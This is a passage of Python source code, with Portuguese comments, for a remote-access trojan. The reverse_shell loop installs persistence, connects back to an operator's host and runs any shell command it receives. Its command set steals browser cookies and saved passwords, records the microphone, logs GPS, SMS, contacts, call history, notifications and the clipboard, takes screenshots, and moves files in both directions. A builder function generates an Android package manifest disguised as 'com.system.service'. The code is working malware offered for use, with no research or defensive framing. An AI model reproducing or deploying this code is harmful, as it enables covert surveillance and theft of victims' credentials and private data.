    """Explora diretório ou baixa arquivo especificado (<list|get> <caminho>)."""
    parts = arg.strip().split(" ", 1) if arg else []
    mode = parts[0].lower() if parts else "list"
    target = parts[1].strip() if len(parts) > 1 else "."
    if mode == "get":
        return cmd_download(target, target_ip, target_port)
    return cmd_ls(target)


def cmd_command_queuing(arg):
    """Gerencia fila de comandos (<add <cmd>|list|clear>)."""
    parts = arg.strip().split(" ", 1) if arg else ["list"]
    sub = parts[0].lower()
    with _QUEUE_LOCK:
        if sub == "add" and len(parts) > 1:
            _COMMAND_QUEUE.append(parts[1].strip())
            return f"[+] Enfileirado ({len(_COMMAND_QUEUE)} na fila).\n".encode("utf-8")
        if sub == "clear":
            _COMMAND_QUEUE.clear()
            return b"[+] Fila limpa.\n"
        return (json.dumps(_COMMAND_QUEUE, indent=2) + "\n").encode("utf-8")


def cmd_built_in_apk_builder(arg, target_ip, target_port):
    """Gera manifesto/template de projeto APK com host/porta configurados em /loot/files/."""
    target_ip_cur, target_port_cur = get_target_endpoint()
    endpoint = arg.strip() if arg and ":" in arg else f"{target_ip_cur}:{target_port_cur}"
    host, port = endpoint.split(":", 1)
    manifest = {
        "package": "com.system.service",
        "connect_host": host,
        "connect_port": int(port) if port.isdigit() else target_port_cur,
        "permissions": [
            "INTERNET", "ACCESS_FINE_LOCATION", "RECORD_AUDIO",
            "READ_CONTACTS", "READ_SMS", "SEND_SMS", "READ_CALL_LOG"
        ],
        "build_tool": "buildozer / android-sdk",
    }
    return _pack_loot("files", "json", json.dumps(manifest, indent=2).encode("utf-8"), target_ip_cur, target_port_cur)


def cmd_autorun():
    """Executa/verifica rotina de inicialização automática no sistema atual."""
    return persist().encode("utf-8", errors="ignore")


def cmd_download(filepath, target_ip, target_port):
    """Lê um arquivo do alvo e envia envelopado para /loot/files/<ip>_<porta>_<data>_<hora>.<extensao>."""
    try:
        if not filepath or not os.path.exists(filepath):
            return b"[-] Arquivo nao encontrado.\n"
        with open(filepath, "rb") as f:
            data = f.read()
        ext = Path(filepath).suffix.lstrip(".") or "bin"
        return _pack_loot("files", ext, data, target_ip, target_port)
    except Exception as e:
        return f"[-] Erro no download: {str(e)}\n".encode('utf-8')


def cmd_upload(filepath, file_data):
    """Salva um arquivo enviado pelo host no alvo."""
    try:
        with open(filepath, "wb") as f:
            f.write(file_data)
        return b"[+] Upload realizado com sucesso.\n"
    except Exception as e:
        return f"[-] Erro no upload: {str(e)}\n".encode('utf-8')


def get_help():
    help_menu = f"""
=========================================================
             COMANDOS DISPONIVEIS (SHELL)
             Plataforma ativa: {detect_platform()}
=========================================================
 help                          - Exibe este menu completo de comandos
 connect <host>:<porta>          - Abre tunel persistente para outro host:porta
 get_paste                     - Exibe todo o conteudo da area de transferencia
 geoloc                        - Consulta ipinfo.io, coordenadas e link do Google Maps
 recent_maps                   - Extrai buscas recentes do Google Maps para /loot/files/
 gps_logging [amostras]        - Coleta GPS/localizacao para /loot/files/
 microphone_recording [seg]    - Grava microfone para /loot/audio/
 record_mic [seg]              - Alias de microphone_recording para /loot/audio/
 view_contacts                 - Lista contatos/usuarios para /loot/files/
 sms_logs                      - Le mensagens SMS para /loot/files/
 send_sms <numero> <mensagem>  - Envia SMS via shell nativo no Android
 call_logs                     - Le historico de chamadas para /loot/files/
 view_installed_apps           - Lista aplicativos instalados para /loot/files/
 view_stub_permissions         - Inspeciona permissoes do processo/stub para /loot/files/
 live_clipboard_logging [seg]  - Monitora area de transferencia para /loot/files/
 live_notification_logging [s] - Captura notificacoes para /loot/files/
 view_wifi_networks            - Lista redes Wi-Fi conhecidas/ativas para /loot/files/
 file_explorer_and_downloader  - Lista ou baixa arquivos (<list|get> <caminho>)
 command_queuing               - Gerencia fila de comandos (<add <cmd>|list|clear>)
 built_in_apk_builder [h:p]    - Gera manifesto/configuracao APK para /loot/files/
 autorun                       - Aplica/verifica inicializacao automatica no sistema
 install_reqs                  - Instala dependencias do sistema atual para /loot/files/
 download_cookies              - Baixa cookies em JSON para /loot/cookies/
 dump_cookies                  - Exibe cookies em JSON bruto no terminal
 dump_pass                     - Extrai credenciais salvas para /loot/files/
 screenshot                    - Captura tela para /loot/pictures/
 download <arquivo>            - Baixa arquivo do alvo para /loot/files/
 upload <arquivo>              - Envia arquivo do host para o alvo
 ls [caminho]                  - Lista arquivos e diretorios detalhadamente
 exit                          - Encerra a sessao atual
 <outro comando>               - Executa comando direto no shell nativo do sistema
=========================================================
"""
    return help_menu.encode('utf-8', errors='ignore')


def reverse_shell():
    persist()
    target_ip, target_port = get_target_endpoint()

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            while True:
                data = s.recv(4096)
                if not data:
                    break

                command = data.decode('utf-8', errors='ignore').strip()
                parts = command.split(" ", 1)
                cmd_name = parts[0].lower()
                cmd_arg = parts[1] if len(parts) > 1 else ""

                output = b""
                try:
                    if cmd_name == 'exit':
                        s.send(b"Sessao encerrada.\n")
                        break
                    elif cmd_name == 'help':
                        output = get_help()
                    elif cmd_name == 'connect':
                        output = cmd_connect(cmd_arg)
                    elif cmd_name == 'get_paste':
                        output = cmd_get_paste(target_ip, target_port)
                    elif cmd_name == 'ls':
                        output = cmd_ls(cmd_arg)
                    elif cmd_name == 'screenshot':
                        output = cmd_screenshot(target_ip, target_port)
                    elif cmd_name == 'download_cookies':
                        output = cmd_download_cookies(target_ip, target_port)
                    elif cmd_name == 'dump_cookies':
                        output = cmd_dump_cookies()
                    elif cmd_name == 'dump_pass':
                        output = cmd_dump_pass(target_ip, target_port)
                    elif cmd_name == 'geoloc':
                        output = cmd_geoloc()
                    elif cmd_name == 'recent_maps':
                        output = cmd_recent_maps(target_ip, target_port)
                    elif cmd_name in ('microphone_recording', 'record_mic'):
                        output = cmd_record_mic(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'gps_logging':
                        output = cmd_gps_logging(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'view_contacts':
                        output = cmd_view_contacts(target_ip, target_port)
                    elif cmd_name == 'sms_logs':
                        output = cmd_sms_logs(target_ip, target_port)
                    elif cmd_name == 'send_sms':
                        output = cmd_send_sms(cmd_arg)
                    elif cmd_name == 'call_logs':
                        output = cmd_call_logs(target_ip, target_port)
                    elif cmd_name == 'view_installed_apps':
                        output = cmd_view_installed_apps(target_ip, target_port)
                    elif cmd_name == 'view_stub_permissions':
                        output = cmd_view_stub_permissions(target_ip, target_port)
                    elif cmd_name == 'live_clipboard_logging':
                        output = cmd_live_clipboard_logging(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'live_notification_logging':
                        output = cmd_live_notification_logging(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'view_wifi_networks':
                        output = cmd_view_wifi_networks(target_ip, target_port)
                    elif cmd_name == 'file_explorer_and_downloader':
                        output = cmd_file_explorer_and_downloader(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'command_queuing':
                        output = cmd_command_queuing(cmd_arg)
                    elif cmd_name == 'built_in_apk_builder':
                        output = cmd_built_in_apk_builder(cmd_arg, target_ip, target_port)
                    elif cmd_name == 'autorun':
                        output = cmd_autorun()
                    elif cmd_name == 'install_reqs':
                        output = cmd_install_reqs(target_ip, target_port)
                    elif cmd_name == 'download':
                        output = cmd_download(cmd_arg, target_ip, target_port)
                    else:
                        kwargs = {}
                        if CREATE_NO_WINDOW:
                            kwargs['creationflags'] = CREATE_NO_WINDOW

                        proc = subprocess.Popen(
                            command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            **kwargs
                        )
                        output = proc.stdout.read() + proc.stderr.read()
                        if not output:
                            output = b"[+] Comando executado sem retorno.\n"
                except Exception as ex:
                    output = f"[-] Erro ao processar comando: {str(ex)}\n".encode('utf-8', errors='ignore')

                s.send(output)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(5)
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass


if __name__ == "__main__":
    reverse_shell()
